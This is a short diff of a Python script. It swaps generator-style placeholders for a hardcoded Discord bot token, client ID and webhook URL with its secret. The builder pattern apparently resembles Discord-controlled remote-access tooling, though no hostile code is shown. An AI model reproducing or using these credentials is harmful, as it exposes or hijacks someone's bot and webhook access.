@@ -18,9 +18,9 @@ import shutil
 import ctypes
 from datetime import datetime, timezone
 
-BOT_TOKEN = "''' + BOT_TOKEN + '''"
-CLIENT_ID = "''' + CLIENT_ID + '''"
-WEBHOOK_URL = "''' + WEBHOOK_URL + '''"
+BOT_TOKEN = "MTUyMDI1NzU5MTA2OTExNDQ0OA.GiqiPN.cGqgzRHz3nYhB0pfpTjjKGSOuryJUn0SSs1RHc"
+CLIENT_ID = "1520257591069114448"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1520235001881428098/P7NpzBNubCGGy4iPHnwsZUV4XBx_HWrw3NuLy99zm4CPFGbNbPDUYZwaD5WdvO8l3UgQ"
 CHANNEL_ID = None
 running = True
 
